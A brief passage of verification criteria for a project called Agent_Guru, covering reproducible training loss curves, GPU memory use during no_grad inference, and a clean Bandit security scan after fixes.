- End-to-end training run: two runs with the same seed produce identical loss curves.
- End-to-end inference: GPU memory before and after `no_grad`-wrapped inference is within 5% of
  baseline.
- Bandit scan: `bandit -r Agent_Guru/ -ll` reports zero HIGH or MEDIUM issues after all fixes.

